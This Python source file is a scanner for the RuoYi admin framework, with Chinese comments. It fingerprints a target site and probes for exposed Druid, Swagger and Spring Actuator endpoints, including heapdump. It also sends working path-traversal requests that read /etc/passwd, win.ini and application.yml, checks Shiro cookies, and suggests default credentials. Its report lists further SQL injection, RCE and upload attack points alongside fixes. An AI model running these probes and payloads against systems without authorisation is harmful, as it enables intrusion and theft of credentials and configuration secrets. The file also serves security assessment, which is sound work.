#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
若依(RuoYi)框架漏洞检测脚本 - 改进版 v3.0
支持非标准路径部署，增强框架识别能力
"""

import requests
import urllib3
import sys
import re
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Tuple, Optional

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class RuoYiScanner:
    def __init__(self, target):
        self.original_target = target
        self.target = self._normalize_url(target)
        self.base_url = self._extract_base_url(target)
        self.context_path = self._extract_context_path(target)  # 新增：提取上下文路径
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/json,*/*',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
        })
        self.vulnerabilities = []

    def _normalize_url(self, url: str) -> str:
        """标准化URL"""
        url = url.rstrip('/')
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url

    def _extract_context_path(self, url: str) -> str:
        """提取上下文路径（如 /public_saas）"""
        parsed = urlparse(url)
        path = parsed.path.rstrip('/')

        # 常见的若依登录路径
        login_patterns = ['/login', '/index', '/main']

        for pattern in login_patterns:
            if pattern in path:
                # 提取pattern之前的部分作为context path
                context = path.split(pattern)[0]
                return context if context else ''

        # 如果没有匹配到，返回整个路径
        return path if path else ''

    def _extract_base_url(self, url: str) -> str:
        """提取基础URL（包含上下文路径）"""
        parsed = urlparse(url)
        context = self._extract_context_path(url)
        return f"{parsed.scheme}://{parsed.netloc}{context}"

    def _build_url(self, path: str) -> List[str]:
        """构建多个可能的URL路径"""
        urls = []

        # 1. 带上下文路径的URL
        if self.context_path:
            urls.append(f"{self.base_url}{path}")

        # 2. 不带上下文路径的URL（直接从根路径）
        parsed = urlparse(self.target)
        root_url = f"{parsed.scheme}://{parsed.netloc}"
        urls.append(f"{root_url}{path}")

        # 3. 原始target的父路径 + path
        if self.context_path:
            urls.append(f"{root_url}{self.context_path}{path}")

        # 去重
        return list(dict.fromkeys(urls))

    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════╗
║         若依(RuoYi)框架漏洞检测工具 v3.0              ║
║              Enhanced Path Detection                     ║
╚══════════════════════════════════════════════════════════╝
"""
        print(banner)
        print(f"[*] 目标URL: {self.target}")
        print(f"[*] 基础URL: {self.base_url}")
        if self.context_path:
            print(f"[*] 上下文路径: {self.context_path}")
        print(f"[*] 开始扫描...\n")

    def _safe_request(self, url: str, method: str = 'GET', **kwargs) -> Tuple[bool, requests.Response]:
        """安全的HTTP请求包装"""
        try:
            kwargs.setdefault('timeout', 8)
            kwargs.setdefault('allow_redirects', False)

            if method.upper() == 'GET':
                r = self.session.get(url, **kwargs)
            elif method.upper() == 'POST':
                r = self.session.post(url, **kwargs)
            else:
                return False, None

            return True, r
        except requests.Timeout:
            return False, None
        except requests.ConnectionError:
            return False, None
        except Exception as e:
            return False, None

    def check_ruoyi(self) -> bool:
        """检测是否为若依框架 - 增强版"""
        print("[1] 正在识别若依框架...")

        # 第一步：检测当前页面
        success, r = self._safe_request(self.target)

        if success and r and r.status_code == 200:
            content = r.text

            # 增强的HTML特征检测
            html_features = [
                ('ruoyi', '若依关键字'),
                ('若依', '若依中文'),
                ('RuoYi', '若依英文'),
                ('用户登录', '登录页面'),
                ('请输入用户名', '用户名输入框'),
                ('请输入密码', '密码输入框'),
                ('验证码', '验证码功能'),
                ('captchaImage', '验证码接口'),
                ('Captcha', '验证码英文'),
                ('登录', '登录按钮'),
                ('用户名', '用户名字段'),
                ('密码', '密码字段')
            ]

            matched_features = []
            for feature, desc in html_features:
                if feature in content:
                    matched_features.append(desc)

            if len(matched_features) >= 3:  # 匹配3个以上特征即认为是若依
                print(f"  [+] 检测到若依框架特征:")
                for feat in matched_features[:5]:  # 显示前5个
                    print(f"      - {feat}")
                return True

        # 第二步：尝试访问验证码接口
        captcha_paths = [
            '/captchaImage',
            '/prod-api/captchaImage',
            '/code',
            '/getCode',
            '/verifyCode'
        ]

        for path in captcha_paths:
            test_urls = self._build_url(path)

            for url in test_urls:
                success, r = self._safe_request(url)

                if success and r and r.status_code == 200:
                    try:
                        json_data = r.json()
                        # 若依验证码接口返回格式：{"code": 200, "msg": "操作成功", "img": "..."}
                        if ('code' in json_data or 'msg' in json_data) and ('img' in json_data or 'uuid' in json_data):
                            print(f"  [+] 发现若依验证码接口: {path}")
                            print(f"      URL: {url}")
                            return True
                    except:
                        pass

        # 第三步：检测登录接口
        login_paths = ['/login', '/auth/login', '/system/login']

        for path in login_paths:
            test_urls = self._build_url(path)

            for url in test_urls:
                success, r = self._safe_request(url)

                if success and r and r.status_code in [200, 401, 403]:
                    if '若依' in r.text or 'ruoyi' in r.text.lower():
                        print(f"  [+] 发现若依登录页面: {path}")
                        return True

        # 第四步：检测静态资源
        static_paths = [
            '/static/ruoyi.js',
            '/static/js/ruoyi.js',
            '/static/css/ruoyi.css',
            '/favicon.ico'
        ]

        for path in static_paths:
            test_urls = self._build_url(path)

            for url in test_urls:
                success, r = self._safe_request(url)

                if success and r and r.status_code == 200:
                    if 'ruoyi' in r.text.lower():
                        print(f"  [+] 发现若依静态资源: {path}")
                        return True

        print("  [-] 未检测到明显的若依框架特征")
        print("  [*] 但会继续执行通用检测...")
        return False

    def check_druid_console(self) -> bool:
        """检测Druid监控页面未授权访问 - 增强版"""
        print("\n[2] 检测Druid监控页面...")

        druid_paths = [
            '/druid/index.html',
            '/druid/login.html',
            '/druid/websession.html',
            '/druid/sql.html',
            '/prod-api/druid/index.html',
            '/../druid/index.html',
        ]

        found = False

        for path in druid_paths:
            test_urls = self._build_url(path)

            for url in test_urls:
                success, r = self._safe_request(url)

                if not success or not r:
                    continue

                druid_features = [
                    'Druid Stat',
                    'DruidDataSource',
                    'druid-index.css',
                    'druid.js',
                    'com.alibaba.druid'
                ]

                if r.status_code == 200:
                    matched_features = [f for f in druid_features if f in r.text]

                    if matched_features:
                        print(f"  [!] 发现Druid监控页面: {path}")
                        print(f"      完整URL: {url}")
                        print(f"      匹配特征: {', '.join(matched_features[:2])}")

                        if 'loginUsername' in r.text or 'loginPassword' in r.text:
                            print(f"      [*] 需要登录认证")
                            print(f"      [*] 尝试默认凭据: admin/admin, root/root, druid/druid")
                            self.vulnerabilities.append({
                                'name': 'Druid监控页面（需认证）',
                                'url': url,
                                'severity': 'Medium'
                            })
                        else:
                            print(f"      [!] 可能无需认证即可访问!")
                            self.vulnerabilities.append({
                                'name': 'Druid监控页面未授权访问',
                                'url': url,
                                'severity': 'High'
                            })

                        found = True
                        break

            if found:
                break

        if not found:
            print("  [-] 未发现Druid监控页面")

        return found

    def check_swagger(self) -> bool:
        """检测Swagger接口文档 - 增强版"""
        print("\n[3] 检测Swagger接口文档...")

        swagger_paths = [
            '/swagger-ui.html',
            '/swagger-ui/index.html',
            '/doc.html',
            '/api.html',
            '/v2/api-docs',
            '/v3/api-docs',
            '/swagger/index.html',
            '/swagger-resources',
            '/prod-api/swagger-ui.html',
            '/prod-api/doc.html',
            '/api/swagger-ui.html'
        ]

        found = False

        for path in swagger_paths:
            test_urls = self._build_url(path)

            for url in test_urls:
                success, r = self._safe_request(url)

                if not success or not r:
                    continue

                if r.status_code == 200:
                    swagger_indicators = [
                        'swagger',
                        'Swagger UI',
                        'api-docs',
                        'springfox',
                        'swagger-ui.css',
                        '"swagger"',
                        'knife4j'
                    ]

                    matched = [ind for ind in swagger_indicators if ind.lower() in r.text.lower()]

                    if matched:
                        print(f"  [!] 发现Swagger文档: {path}")
                        print(f"      完整URL: {url}")
                        print(f"      [!] 可能泄露完整API接口信息")

                        self.vulnerabilities.append({
                            'name': 'Swagger API文档泄露',
                            'url': url,
                            'severity': 'Medium'
                        })

                        found = True
                        break

            if found:
                break

        if not found:
            print("  [-] 未发现Swagger文档")

        return found

    def check_actuator(self) -> bool:
        """检测Spring Boot Actuator端点 - 增强版"""
        print("\n[4] 检测Actuator端点...")

        actuator_endpoints = [
            '/actuator',
            '/actuator/env',
            '/actuator/health',
            '/actuator/metrics',
            '/actuator/mappings',
            '/actuator/configprops',
            '/actuator/beans',
            '/actuator/heapdump',
            '/actuator/threaddump',
            '/prod-api/actuator',
            '/prod-api/actuator/env'
        ]

        found_endpoints = []

        for endpoint in actuator_endpoints:
            test_urls = self._build_url(endpoint)

            for url in test_urls:
                success, r = self._safe_request(url)

                if not success or not r:
                    continue

                if r.status_code == 200:
                    try:
                        json_data = r.json()

                        if isinstance(json_data, dict):
                            print(f"  [!] 发现可访问的Actuator端点: {endpoint}")
                            print(f"      完整URL: {url}")

                            severity = 'Low'
                            if 'env' in endpoint or 'configprops' in endpoint:
                                print(f"      [!] 可能泄露配置信息（数据库密码、密钥等）")
                                severity = 'High'
                            elif 'heapdump' in endpoint:
                                print(f"      [!] 可下载堆转储文件（严重信息泄露）")
                                severity = 'Critical'
                            elif 'mappings' in endpoint:
                                print(f"      [!] 可获取所有路由映射")
                                severity = 'Medium'

                            found_endpoints.append(endpoint)
                            self.vulnerabilities.append({
                                'name': f'Actuator端点: {endpoint}',
                                'url': url,
                                'severity': severity
                            })
                            break

                    except:
                        if 'actuator' in r.text.lower() or '_links' in r.text:
                            print(f"  [!] 发现Actuator端点: {endpoint}")
                            print(f"      完整URL: {url}")
                            found_endpoints.append(endpoint)
                            break

        if found_endpoints:
            print(f"  [+] 共发现 {len(found_endpoints)} 个可访问端点")
            return True
        else:
            print("  [-] 未发现可访问的Actuator端点")
            return False

    def check_file_read(self) -> bool:
        """检测任意文件读取漏洞 - 增强版"""
        print("\n[5] 检测任意文件读取漏洞...")

        test_cases = [
            {
                'path': '/common/download/resource?resource=/profile/../../../../etc/passwd',
                'indicators': ['root:x:', 'daemon:', 'bin:'],
                'os': 'Linux'
            },
            {
                'path': '/common/download?resource=../../../../etc/passwd',
                'indicators': ['root:x:', 'daemon:', 'bin:'],
                'os': 'Linux'
            },
            {
                'path': '/common/download/resource?resource=/profile/../../../../windows/win.ini',
                'indicators': ['[extensions]', '[files]', '; for 16-bit app support'],
                'os': 'Windows'
            },
            {
                'path': '/common/download/resource?resource=/profile/../../../../application.yml',
                'indicators': ['spring:', 'datasource:', 'password:'],
                'os': 'App Config'
            }
        ]

        print("  [*] 影响版本: RuoYi <= 4.7.8")
        print("  [*] 尝试读取系统文件...")

        found = False

        for test in test_cases:
            test_urls = self._build_url(test['path'])

            for url in test_urls:
                success, r = self._safe_request(url)

                if not success or not r:
                    continue

                if r.status_code == 200:
                    matched = [ind for ind in test['indicators'] if ind in r.text]

                    if matched:
                        print(f"  [!!!] 存在任意文件读取漏洞!")
                        print(f"        目标系统: {test['os']}")
                        print(f"        匹配特征: {matched[0]}")
                        print(f"        利用URL: {url}")

                        self.vulnerabilities.append({
                            'name': '任意文件读取漏洞',
                            'url': url,
                            'severity': 'Critical'
                        })

                        found = True
                        break

            if found:
                break

        if not found:
            print("  [-] 未检测到可直接利用的文件读取漏洞")
            print("  [*] 注意: 此漏洞通常需要登录后才能利用")

        return found

    def check_shiro(self) -> bool:
        """检测Shiro反序列化漏洞特征 - 增强版"""
        print("\n[6] 检测Shiro反序列化漏洞...")

        print("  [*] 影响版本: RuoYi < 4.6.2")

        success, r = self._safe_request(self.target)

        if not success or not r:
            print("  [-] 无法连接目标")
            return False

        cookies = r.cookies
        headers = r.headers

        has_shiro = False

        if 'rememberMe' in cookies or 'rememberMe' in str(cookies):
            print("  [+] 检测到rememberMe Cookie (Shiro特征)")
            has_shiro = True

        if 'Set-Cookie' in headers and 'rememberMe=deleteMe' in headers.get('Set-Cookie', ''):
            print("  [+] 检测到deleteMe响应 (Shiro特征)")
            has_shiro = True

        if not has_shiro:
            print("  [-] 未检测到明显的Shiro框架特征")
            return False

        print("  [*] 尝试检测Shiro默认密钥...")

        test_cookie = "rememberMe=1"

        success, r = self._safe_request(
            self.target,
            cookies={'rememberMe': test_cookie}
        )

        if success and r:
            response_cookie = r.headers.get('Set-Cookie', '')

            if 'rememberMe=deleteMe' in response_cookie:
                print("  [!] 可能存在Shiro反序列化漏洞!")
                print("  [!] 建议使用专业工具进一步检测:")
                print("      - ShiroScan")
                print("      - shiro_attack")
                print("      - ysoserial")

                self.vulnerabilities.append({
                    'name': 'Shiro反序列化漏洞（需进一步验证）',
                    'url': self.target,
                    'severity': 'Critical'
                })

                return True

        print("  [*] 无法确认是否存在漏洞，建议手工测试")
        return False

    def generate_report(self):
        """生成检测报告"""
        print("\n" + "=" * 70)
        print("扫描完成! 检测报告")
        print("=" * 70)

        if self.vulnerabilities:
            print(f"\n[!] 发现 {len(self.vulnerabilities)} 个潜在安全问题:\n")

            critical = [v for v in self.vulnerabilities if v['severity'] == 'Critical']
            high = [v for v in self.vulnerabilities if v['severity'] == 'High']
            medium = [v for v in self.vulnerabilities if v['severity'] == 'Medium']
            low = [v for v in self.vulnerabilities if v['severity'] == 'Low']

            if critical:
                print("【严重】Critical:")
                for v in critical:
                    print(f"  - {v['name']}")
                    print(f"    URL: {v['url']}\n")

            if high:
                print("【高危】High:")
                for v in high:
                    print(f"  - {v['name']}")
                    print(f"    URL: {v['url']}\n")

            if medium:
                print("【中危】Medium:")
                for v in medium:
                    print(f"  - {v['name']}")
                    print(f"    URL: {v['url']}\n")

            if low:
                print("【低危】Low:")
                for v in low:
                    print(f"  - {v['name']}")
                    print(f"    URL: {v['url']}\n")
        else:
            print("\n[+] 未发现明显的安全问题（在无认证情况下）")

        print("\n" + "=" * 70)
        print("需要登录才能测试的已知漏洞:")
        print("=" * 70)
        print("""
1. SQL注入漏洞
   - /system/dept/list (deptId参数)
   - /system/role/list (roleId参数)

2. 定时任务命令执行 (RCE)
   - /monitor/job/add
   - 影响版本: <= 4.7.6

3. 任意文件下载
   - /common/download/resource

4. Thymeleaf模板注入
   - /monitor/cache/getNames

5. 文件上传漏洞
   - /common/upload
        """)

        print("=" * 70)
        print("修复建议:")
        print("=" * 70)
        print("""
1. 升级到最新版本的若依框架
2. 禁用或限制Druid监控页面访问（IP白名单）
3. 关闭Swagger文档或增加认证
4. 禁用Spring Boot Actuator或限制访问
5. 修改默认密码: admin/admin123 -> 强密码
6. 配置Shiro使用随机密钥
7. 对所有用户输入进行严格过滤和验证
        """)

    def scan(self):
        """执行完整扫描"""
        self.print_banner()

        is_ruoyi = self.check_ruoyi()

        if not is_ruoyi:
            print("\n[!] 警告: 目标可能不是若依框架")
            print("[*] 但仍会继续执行通用检测...\n")

        self.check_druid_console()
        self.check_swagger()
        self.check_actuator()
        self.check_file_read()
        self.check_shiro()

        self.generate_report()


def main():
    if len(sys.argv) != 2:
        print("""
若依(RuoYi)框架漏洞检测工具 v3.0

用法: python3 ruoyi_scanner.py <target_url>

示例:
  python3 ruoyi_scanner.py http://example.com
  python3 ruoyi_scanner.py http://example.com:8080/public_saas/login
  python3 ruoyi_scanner.py https://example.com/app

注意:
  - 仅在授权范围内使用
  - 支持非标准路径部署的若依系统
  - 需要Python 3.6+和requests库
        """)
        sys.exit(1)

    target = sys.argv[1]

    print("[*] 初始化扫描器...")
    scanner = RuoYiScanner(target)

    try:
        scanner.scan()
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断扫描")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] 扫描过程中发生错误: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()